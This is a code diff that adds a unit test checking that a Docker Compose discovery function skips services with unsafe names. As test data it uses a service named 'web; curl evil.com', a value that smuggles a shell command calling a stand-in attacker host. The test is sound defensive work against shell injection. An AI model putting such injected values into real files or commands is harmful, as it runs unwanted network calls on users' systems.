@@ -266,6 +266,27 @@ services:
 		const resources = discoverDockerCompose(tmpDir);
 		expect(resources).toEqual([]);
 	});
+
+	it("skips services with unsafe names to prevent shell injection", () => {
+		writeFileSync(
+			join(tmpDir, "docker-compose.yml"),
+			`
+services:
+  "web; curl evil.com":
+    image: nginx
+    ports:
+      - "8080:80"
+  db:
+    image: postgres:15
+    ports:
+      - "5432:5432"
+`,
+		);
+
+		const resources = discoverDockerCompose(tmpDir);
+		expect(resources).toHaveLength(1);
+		expect(resources[0]?.name).toBe("db");
+	});
 });
 
 describe("discoverEnvFile", () => {
